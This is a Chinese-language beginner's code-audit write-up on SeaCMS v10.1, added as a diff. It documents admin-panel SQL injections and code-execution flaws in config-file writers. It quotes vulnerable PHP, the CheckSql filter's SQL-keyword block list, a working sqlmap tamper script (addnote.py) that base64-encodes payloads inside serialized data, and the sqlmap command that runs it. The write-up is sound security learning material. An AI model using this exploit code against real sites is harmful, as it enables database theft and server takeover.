@@ -1,0 +1,726 @@
+## 前言
+
+ **seacms是一个代码审计入门级的cms，比较适合我这种小白玩家来学习，如果有什么错误欢迎指出。**
+
+## 环境
+
+> phpstudy pro
+>
+> php5.4.45nts
+
+seay代码审计工具
+
+> phpstrom
+>
+> sqlmap
+>
+> seacms v10.1
+
+因为这个cms的官网已经打不开了，所以发一下自己保存的代码
+
+> 链接<https://pan.baidu.com/s/1f9mXyOX6sgsersyNz-kDQg>提取码j3k0
+
+## 安装cms
+
+可以参照目录下的海洋CMS使用手册来进行配置
+
+![image.png](https://image.3001.net/images/20200623/1592907106_5ef1d5627e47d.png!small)  
+
+在安装之后系统会生成一个随机后台
+
+![image.png](https://image.3001.net/images/20200623/1592907138_5ef1d582a7040.png!small)
+
+## 思路总结
+
+通过查看目录结构与相关文件名称了解功能，查看配置文件，
+
+浏览网站，了解cms的功能，对可能存在漏洞的地方进行记录，也可以结合xray进行扫描，
+
+不过个人不太推荐结合xray，特别是在测试后台的时候，可能会把环境搞蹦，并且成功率不是很高
+
+对文件上传，sql语句拼接，文件写入（写配置）相关功能点重点关注，
+
+如果自动化工具不能找到漏洞点，可以通过seay配合，查看可能的漏洞点，进行反向查找
+
+如果对代码不够理解的话可以通过phpstrom进行动态调试，查看参数传递与语句拼接，
+
+通过phpstrom调试查看自己的payload在哪里被过滤与处理，进行相应修改
+
+## 代码审计
+
+### 目录结构
+
+![1592907193_5ef1d5b917f13.png!small](https://image.3001.net/images/20200623/1592907193_5ef1d5b917f13.png!small)
+
+│─admin //后台管理目录（这里为随机生成的w1aqhp）
+
+│ │─coplugins //已停用目录
+
+│ │─ebak //帝国备份王数据备份
+
+│ │─editor //编辑器
+
+│ │─img //后台静态文件
+
+│ │─js //后台js文件
+
+│ │─templets //后台模板文件
+
+│─article //文章内容页
+
+│─articlelist //文章列表页
+
+│─comment //评论
+
+│ │─api //评论接口文件
+
+│ │─images //评论静态文件
+
+│ │─js //评论js文件
+
+│─data //配置数据及缓存文件
+
+│ │─admin //后台配置保存
+
+│ │─cache //缓存
+
+│ │─mark //水印
+
+│ │─sessions //sessions文件
+
+│─detail //视频内容页
+
+│─include //核心文件
+
+│ │─crons //定时任务配置
+
+│ │─data //静态文件
+
+│ │─inc //扩展文件
+
+│ │─webscan //360安全监测模块
+
+│─install //安装模块
+
+│ │─images //安装模块静态文件
+
+│ │─templates //安装模块模板
+
+│─js //js文件
+
+│ │─ads //默认广告目录
+
+│ │─player //播放器目录
+
+│─list //视频列表页
+
+│─news //文章首页
+
+│─pic //静态文件
+
+│ │─faces //表情图像
+
+│ │─member //会员模块界面
+
+│ │─slide //旧版Flash幻灯片
+
+│ │─zt //专题静态文件
+
+│─templets //模板目录
+
+│─topic //专题内容页
+
+│─topiclist //专题列表页
+
+│─uploads //上传文件目录
+
+│─video //视频播放页
+
+│─weixin //微信接口目录
+
+└─index.php //首页文件
+
+### 后台sql注入（一）
+
+在对后台测试的时候，在添加数据的时候系统都会先检查数据是否存在，如果不存在之后再进行添加，于是分析检查数据存在的数据包
+
+![image.png](https://image.3001.net/images/20200623/1592907215_5ef1d5cf39524.png!small)  
+
+在`w1aqhp\admin_ajax.php`的`76`行进入判断
+
+    
+    
+    elseif($action=="checkrepeat")  
+    {  
+        $v_name=iconv('utf-8','utf-8',$_GET["v_name"]);   
+        $row=$dsql->GetOne("select count(*) as dd from sea_data where v_name='$v_name'");  
+        $num=$row['dd'];  
+        if($num==0){echo "ok";}else{echo "err";}  
+    }
+
+对传入的参数进行编码处理，在下一行对参数进行拼接没有进行过滤，跟进`GetOne`函数
+
+    
+    
+        function GetOne($sql='' )  
+        {  
+            global $dsql;  
+            if($dsql->isClose)  
+            {  
+                $this->Open(false);  
+                $dsql->isClose = false;  
+            }  
+            //SQL语句安全检查  
+            $sql=CheckSql($sql);  
+            if(!empty($sql))  
+            {  
+                if(!m_eregi("limit",$sql)) $this->SetQuery(m_eregi_replace("[,;]$",'',trim($sql))." limit 0,1;");  
+                else $this->SetQuery($sql);  
+            }  
+            $this->Execute("one");  
+            $arr = $this->GetArray("one");  
+            if(!is_array($arr))  
+            {  
+                return '';  
+            }  
+            else  
+            {  
+                @mysqli_free_result($this->result["one"]); return($arr);  
+            }  
+        }
+
+进行了sql语句安全检查，跟进`CheckSql`函数
+
+    
+    
+    //SQL语句过滤程序，由80sec提供，这里作了适当的修改  
+    function CheckSql($db_string,$querytype='select')  
+    {  
+        global $cfg_cookie_encode;  
+        $clean = '';  
+        $error='';  
+        $old_pos = 0;  
+        $pos = -1;  
+        $log_file = sea_INC.'/../data/'.md5($cfg_cookie_encode).'_safe.txt';  
+        $userIP = GetIP();  
+        $getUrl = GetCurUrl();    
+        $db_string = str_ireplace('--', "", $db_string);  
+        $db_string = str_ireplace('/*', "", $db_string);  
+        $db_string = str_ireplace('*/', "", $db_string);  
+        $db_string = str_ireplace('*!', "", $db_string);  
+        $db_string = str_ireplace('//', "", $db_string);  
+        $db_string = str_ireplace('\\', "", $db_string);  
+        $db_string = str_ireplace('hex', "he", $db_string);   
+        $db_string = str_ireplace('updatexml', "updatexm", $db_string);  
+        $db_string = str_ireplace('extractvalue', "extractvalu", $db_string);  
+        $db_string = str_ireplace('benchmark', "benchmar", $db_string);  
+        $db_string = str_ireplace('sleep', "slee", $db_string);  
+        $db_string = str_ireplace('load_file', "load-file", $db_string);  
+        $db_string = str_ireplace('outfile', "out-file", $db_string);  
+        $db_string = str_ireplace('ascii', "asci", $db_string);   
+        $db_string = str_ireplace('char(', "cha", $db_string);    
+        $db_string = str_ireplace('substr', "subst", $db_string);  
+        $db_string = str_ireplace('substring', "substrin", $db_string);  
+        $db_string = str_ireplace('script', "scrip", $db_string);  
+        $db_string = str_ireplace('frame', "fram", $db_string);  
+        $db_string = str_ireplace('information_schema', "information-schema", $db_string);  
+        $db_string = str_ireplace('exp', "ex", $db_string);  
+        $db_string = str_ireplace('GeometryCollection', "GeometryCollectio", $db_string);  
+        $db_string = str_ireplace('polygon', "polygo", $db_string);  
+        $db_string = str_ireplace('multipoint', "multipoin", $db_string);  
+        $db_string = str_ireplace('multilinestring', "multilinestrin", $db_string);  
+        $db_string = str_ireplace('linestring', "linestrin", $db_string);  
+        $db_string = str_ireplace('multipolygon', "multipolygo", $db_string);     
+    ​  
+        //如果是普通查询语句，直接过滤一些特殊语法  
+        if($querytype=='select')  
+        {  
+            $notallow1 = "[^0-9a-z@\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\.-]{1,}";  
+    ​  
+            //$notallow2 = "--|/\*";  
+            if(m_eregi($notallow1,$db_string)){exit('SQL check');}  
+            if(m_eregi('<script',$db_string)){exit('SQL check');}  
+            if(m_eregi('/script',$db_string)){exit('SQL check');}  
+            if(m_eregi('script>',$db_string)){exit('SQL check');}  
+            if(m_eregi('if:',$db_string)){exit('SQL check');}  
+            if(m_eregi('--',$db_string)){exit('SQL check');}  
+            if(m_eregi('char(',$db_string)){exit('SQL check');}  
+            if(m_eregi('*/',$db_string)){exit('SQL check');}  
+        }  
+    ​  
+        //完整的SQL检查  
+        while (true)  
+        {  
+            $pos = stripos($db_string, '\'', $pos + 1);  
+            if ($pos === false)  
+            {  
+                break;  
+            }  
+            $clean .= substr($db_string, $old_pos, $pos - $old_pos);  
+            while (true)  
+            {  
+                $pos1 = stripos($db_string, '\'', $pos + 1);  
+                $pos2 = stripos($db_string, '\\', $pos + 1);  
+                if ($pos1 === false)  
+                {  
+                    break;  
+                }  
+                elseif ($pos2 == false || $pos2 > $pos1)  
+                {  
+                    $pos = $pos1;  
+                    break;  
+                }  
+                $pos = $pos2 + 1;  
+            }  
+            $clean .= '$s$';  
+            $old_pos = $pos + 1;  
+        }  
+        $clean .= substr($db_string, $old_pos);  
+        $clean = trim(strtolower(preg_replace(array('~\s+~s' ), array(' '), $clean)));  
+    ​  
+        if (stripos($clean, '@') !== FALSE  OR stripos($clean,'char(')!== FALSE  OR stripos($clean,'script>')!== FALSE   OR stripos($clean,'<script')!== FALSE  OR stripos($clean,'"')!== FALSE OR stripos($clean,'$s$$s$')!== FALSE)  
+            {  
+                $fail = TRUE;  
+                if(preg_match("#^create table#i",$clean)) $fail = FALSE;  
+                $error="unusual character";  
+            }  
+        //老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它  
+        if (stripos($clean, 'union') !== false && preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0)  
+        {  
+            $fail = true;  
+            $error="union detect";  
+        }  
+    ​  
+        //发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们  
+        elseif (stripos($clean, '/*') > 2 || stripos($clean, '--') !== false || stripos($clean, '#') !== false)  
+        {  
+            $fail = true;  
+            $error="comment detect";  
+        }  
+    ​  
+        //这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库  
+        elseif (stripos($clean, 'sleep') !== false && preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0)  
+        {  
+            $fail = true;  
+            $error="sleep detect";  
+        }  
+        elseif (stripos($clean, 'updatexml') !== false && preg_match('~(^|[^a-z])updatexml($|[^[a-z])~s', $clean) != 0)  
+        {  
+            $fail = true;  
+            $error="updatexml  detect";  
+        }  
+        elseif (stripos($clean, 'extractvalue') !== false && preg_match('~(^|[^a-z])extractvalue($|[^[a-z])~s', $clean) != 0)  
+        {  
+            $fail = true;  
+            $error="extractvalue  detect";  
+        }  
+        elseif (stripos($clean, 'benchmark') !== false && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0)  
+        {  
+            $fail = true;  
+            $error="benchmark detect";  
+        }  
+        elseif (stripos($clean, 'load_file') !== false && preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0)  
+        {  
+            $fail = true;  
+            $error="file fun detect";  
+        }  
+        elseif (stripos($clean, 'into outfile') !== false && preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~s', $clean) != 0)  
+        {  
+            $fail = true;  
+            $error="file fun detect";  
+        }  
+    ​  
+        //老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息  
+        elseif (preg_match('~\([^)]*?select~s', $clean) != 0)  
+        {  
+            $fail = true;  
+            $error="sub select detect";  
+        }  
+        if (!empty($fail))  
+        {  
+            fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||$error\r\n");  
+            exit("<font size='5' color='red'>Safe Alert: Request Error step 2!</font>");  
+        }  
+        else  
+        {  
+    ​  
+            return $db_string;  
+        }  
+    }
+
+在进行过滤的时候都是使用的小写，使用大写可以绕过，但是在`623`行对sql语句使用了`strtolower`处理，不能够使用select子查询，所以此处只能注入出当前数据库
+
+![_2.jpg](https://image.3001.net/images/20200623/1592907415_5ef1d697f3d2f.jpg!small)
+
+### 后台sql注入（二）
+
+在`w1aqhp/admin_comment_news.php`下的`54`行的删除评论操作
+
+    
+    
+    elseif($action=="delallcomment")  
+    {  
+        if(empty($e_id))  
+        {  
+            ShowMsg("请选择需要删除的评论","-1");  
+            exit();  
+        }  
+        $ids = implode(',',$e_id);  
+        delcommentcache($ids);  
+        $dsql->ExecuteNoneQuery("delete from sea_comment where id in(".$ids.")");  
+        ShowMsg("成功删除所选评论！","admin_comment_news.php");  
+        exit();  
+    }
+
+传入参数`e_id`，跟进`delcommentcache`函数
+
+    
+    
+    function delcommentcache($id)  
+    {  
+        global $dsql;  
+        $dsql->setQuery("select v_id from sea_comment where id in (".$id.")");  
+        $dsql->Execute("delcommentcache");  
+        while($row = $dsql->GetArray("delcommentcache"))  
+        {  
+            if(file_exists(sea_DATA.'/cache/review/1/'.$row['v_id'].'.js'))  
+            {  
+                delfile(sea_DATA.'/cache/review/1/'.$row['v_id'].'.js');  
+            }  
+        }  
+    }
+
+对传入数据没有进行处理直接拼接，跟进`setQuery`
+
+    
+    
+        //设置SQL语句，会自动把SQL语句里的sea_替换为$this->dbPrefix(在配置文件中为$cfg_dbprefix)  
+        function SetQuery($sql)  
+        {  
+            $prefix="sea_";  
+            $sql = str_replace($prefix,$this->dbPrefix,$sql);  
+            $this->queryString = $sql;  
+        }
+
+没有进行过滤，跟进`Execute`
+
+    
+    
+        function Execute($id="me", $sql='')  
+        {  
+            global $dsql;  
+            self::$i++;  
+            if($dsql->isClose)  
+            {  
+                $this->Open(false);  
+                $dsql->isClose = false;  
+            }  
+            if(!empty($sql))  
+            {  
+                $this->SetQuery($sql);  
+            }  
+    ​  
+            //SQL语句安全检查  
+            if($this->safeCheck)  
+            {  
+                CheckSql($this->queryString);  
+            }  
+          
+        $t1 = ExecTime();  
+              
+            $this->result[$id] = mysqli_query($this->linkID,$this->queryString);  
+              
+            //查询性能测试  
+            //$queryTime = ExecTime() - $t1;  
+            //if($queryTime > 0.05) {  
+                //echo $this->queryString."--{$queryTime}<hr />\r\n";   
+            //}  
+              
+            if($this->result[$id]===false)  
+            {  
+                $this->DisplayError(mysqli_error($this->linkID)." <br />Error sql: <font color='red'>".$this->queryString."</font>");  
+            }  
+        }
+
+发现默认没有开启sql语句安全检查
+
+![aHR0cHM6Ly9wMC5zc2wucWhpbWcuY29tL3QwMWE2OThlZTFmOTQ5ZjUxYzcucG5n_meitu_3.jpg](https://image.3001.net/images/20200623/1592907514_5ef1d6fab5bb4.jpg!small)  
+
+存在注入
+
+![aHR0cHM6Ly9wMS5zc2wucWhpbWcuY29tL3QwMTkyOGZjYWY5NTU2ZjJkYTQucG5n_meitu_4.jpg](https://image.3001.net/images/20200623/1592907611_5ef1d75b063de.jpg!small)
+
+### 后台sql注入（三）
+
+在`w1aqhp/admin_video.php`的44行进入判断，在`85-88`行对用户传入参数进行处理，没有过滤
+
+![image.png](https://image.3001.net/images/20200623/1592907690_5ef1d7aa01dcd.png!small)  
+
+在`123`行，直接对参数进行拼接
+
+![image.png](https://image.3001.net/images/20200623/1592907705_5ef1d7b9d3b70.png!small)  
+
+在`124`行，跟进`ExecuteNoneQuery`
+
+    
+    
+        function ExecuteNoneQuery($sql='')  
+        {  
+            global $dsql;  
+            self::$i++;  
+            if($dsql->isClose)  
+            {  
+                $this->Open(false);  
+                $dsql->isClose = false;  
+            }  
+            if(!empty($sql))  
+            {  
+                $this->SetQuery($sql);  
+            }  
+            if(is_array($this->parameters))  
+            {  
+                foreach($this->parameters as $key=>$value)  
+                {  
+                    $this->queryString = str_replace("@".$key,"'$value'",$this->queryString);  
+                }  
+            }  
+    ​  
+            //SQL语句安全检查  
+            if($this->safeCheck) CheckSql($this->queryString,'update');  
+            return mysqli_query($this->linkID,$this->queryString);  
+        }
+
+默认没有进行sql语句安全检查
+
+![aHR0cHM6Ly9wMi5zc2wucWhpbWcuY29tL3QwMTAzODA5OTZiYzI0MmM1MWUucG5n_meitu_6.jpg](https://image.3001.net/images/20200623/1592907851_5ef1d84b00fd5.jpg!small)  
+
+丢到sqlmap
+
+![image.png](https://image.3001.net/images/20200623/1592907891_5ef1d873456c9.png!small)  
+
+![aHR0cHM6Ly9wMC5zc2wucWhpbWcuY29tL3QwMThlZTE5NmMzMDIyYTUwNzQucG5n_meitu_7.jpg](https://image.3001.net/images/20200623/1592907959_5ef1d8b7a190d.jpg!small)  
+
+### 后台sql注入（四）
+
+在`w1aqhp/admin_collect_news.php`的`382`行，使用`importok`时
+
+    
+    
+    elseif($action=="importok")
+    {
+    	$importrule = trim($importrule);
+    	if(empty($importrule))
+    	{
+    		ShowMsg("规则内容为空！","-1");
+    		exit();
+    	}
+    	//对Base64格式的规则进行解码
+    	if(m_ereg('^BASE64:',$importrule))
+    	{
+    		if(!m_ereg(':END$',$importrule))
+    		{
+    			ShowMsg('该规则不合法，Base64格式的采集规则为：BASE64:base64编码后的配置:END !','-1');
+    			exit();
+    		}
+    		$importrules = explode(':',$importrule);
+    		$importrule = $importrules[1];
+    		$importrule = unserialize(base64_decode($importrule)) OR  die('配置字符串有错误！'); 
+    		//die(base64_decode($importrule));
+    	}
+    	else
+    	{
+    		ShowMsg('该规则不合法，Base64格式的采集规则为：BASE64:base64编码后的配置:END !','-1');
+    		exit();
+    	}
+    	if(!is_array($importrule) || !is_array($importrule['config']) || !is_array($importrule['type']))
+    	{
+    		ShowMsg('该规则不合法，无法导入!','-1');
+    		exit();
+    	}
+    	$data = $importrule['config'];
+    	unset($data['cid']);
+    	$data['cname'].="(导入时间:".date("Y-m-d H:i:s").")";
+    	$data['cotype'] = '1';
+    	$sql = si("sea_co_config",$data,1);
+    	$dsql->ExecuteNoneQuery($sql);
+    	$cid = $dsql->GetLastID();
+    	if (!empty($importrule['type'])){
+    		foreach ($importrule['type'] as $type){
+    			unset($type['tid']);
+    			$type['cid'] = $cid;
+    			$type['addtime'] = time();
+    			$type['cjtime'] = '';
+    			$type['cotype'] = '1';
+    			$data = $type;
+    			$sql = si("sea_co_type",$data,1);
+    			$dsql->ExecuteNoneQuery($sql);
+    		}
+    	}
+    	ShowMsg('成功导入规则!','admin_collect_news.php');
+    	exit;
+    }
+    
+
+首先判断传入的字符串是否符合格式，之后进行`base64解码`之后进行反序列化操作
+
+在`408`行 判断`反序列化`之后的字符串是否符合要求
+
+在`417`行对sql语句进行拼接，返回语句
+
+在`418`行执行语句，跟进`ExecuteNoneQuery`
+
+默认没有过滤sql语句
+
+![1592907851_5ef1d84b00fd5.jpg!small](https://image.3001.net/images/20200623/1592907851_5ef1d84b00fd5.jpg!small)  
+
+因为这里对传入数据进行了编码处理，所以编写sqlmap的tamper脚本
+
+`addnote.py`
+
+    
+    
+    #!/usr/bin/env python
+    #addnote.py
+    """
+    Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+    See the file 'LICENSE' for copying permission
+    """
+    import re
+    import base64
+    
+    from lib.core.common import randomRange
+    from lib.core.compat import xrange
+    from lib.core.data import kb
+    from lib.core.enums import PRIORITY
+    
+    __priority__ = PRIORITY.HIGH
+    
+    def dependencies():
+        pass
+    
+    def tamper(payload, **kwargs):
+    
+        b='getlistnum`) values(3+(1=2 qqq))#'
+        b=b.replace('qqq',payload)
+        a='a:2:{s:6:"config";a:3:{s:5:"cname";s:1:"1";s:6:"cotype";s:1:"1";s:len:"string";i:123;}s:4:"type";a:0:{}}'
+        a=a.replace('len',str(len(b)))
+        a=a.replace('string',b)
+        retVal="BASE64:"+base64.b64encode(a)+":END"
+        return retVal
+    
+
+丢到sqlmap
+
+    
+    
+    sqlmap.py -r C:\Users\11962\Desktop\12.txt -p importrule --dbms mysql --risk 3 -v 3 --dbs --tamper=addnote
+    
+
+![image.png](https://image.3001.net/images/20200623/1592908015_5ef1d8ef1a1b7.png!small)
+
+### 后台命令执行（一）
+
+在`w1aqhp/admin_ip.php`下第五行使用set参数
+
+    
+    
+    if($action=="set")
+    {
+    	$v= $_POST['v'];
+    	$ip = $_POST['ip'];
+    	$open=fopen("../data/admin/ip.php","w" );
+    	$str='<?php ';
+    	$str.='$v = "';
+    	$str.="$v";
+    	$str.='"; ';
+    	$str.='$ip = "';
+    	$str.="$ip";
+    	$str.='"; ';
+    	$str.=" ?>";
+    	fwrite($open,$str);
+    	fclose($open);
+    	ShowMsg("成功保存设置!","admin_ip.php");
+    	exit;
+    }
+    
+
+对用户输入没有进行任何处理，直接写入文件
+
+构造payload
+
+![image.png](https://image.3001.net/images/20200623/1592908038_5ef1d906557d1.png!small)  
+
+查看`\data\admin\ip.php`
+
+![image.png](https://image.3001.net/images/20200623/1592908056_5ef1d91891869.png!small)  
+
+![image.png](https://image.3001.net/images/20200623/1592908080_5ef1d930f3dc8.png!small)
+
+### 后台命令执行（二）
+
+在`w1aqhp/admin_weixin.php`下第五行，使用`set`参数
+
+对传入参数没有进行处理，拼接字符串
+
+![format,png](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wMS5zc2wucWhpbWcuY29tL3QwMWZiMTA1YWMxYTEzMzVmMWIucG5n?x-oss-process=image/format,png)
+
+在`118`行写入文件
+
+![format,png](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wNC5zc2wucWhpbWcuY29tL3QwMWE1ZTljZDA5Y2UyNjFmZGEucG5n?x-oss-process=image/format,png)
+
+构造payload
+
+![image.png](https://image.3001.net/images/20200623/1592908111_5ef1d94f0a05f.png!small)  
+
+访问`/data/admin/weixin.php`
+
+![image.png](https://image.3001.net/images/20200623/1592908131_5ef1d9632a2f1.png!small)
+
+### 后台命令执行（三）
+
+在`w1aqhp/admin_notify.php`第五行
+
+    
+    
+    if($action=="set")
+    {
+    	$notify1= $_POST['notify1'];
+    	$notify2= $_POST['notify2'];
+    	$notify3= $_POST['notify3'];
+    	$open=fopen("../data/admin/notify.php","w" );
+    	$str='<?php ';
+    	$str.='$notify1 = "';
+    	$str.="$notify1";
+    	$str.='"; ';
+    	$str.='$notify2 = "';
+    	$str.="$notify2";
+    	$str.='"; ';
+    	$str.='$notify3 = "';
+    	$str.="$notify3";
+    	$str.='"; ';
+    	$str.=" ?>";
+    	fwrite($open,$str);
+    	fclose($open);
+    	ShowMsg("成功保存设置!","admin_notify.php");
+    	exit;
+    }
+    
+
+对传入的数据没有进行处理，直接拼接字符串之后写入文件
+
+构造payload
+
+![1592908157_5ef1d97d3498a.png!small](https://image.3001.net/images/20200623/1592908157_5ef1d97d3498a.png!small)
+
+访问/data/admin/notify.php
+
+![1592908175_5ef1d98fc8b13.png!small](https://image.3001.net/images/20200623/1592908175_5ef1d98fc8b13.png!small)
+
+## 总结
+
+虽然这是一个入门的cms，也都是后台的漏洞，但是也从中学到了知识，同时还要细心，对可能存在的漏洞点进行测试。
+
+如果对代码理解不够或者对于后台逻辑不太理解的话可以通过动态调试来加深理解，一些全局的函数搜索推荐seay源代码审计系统。
+
+如果哪里有错误欢迎指正。
+
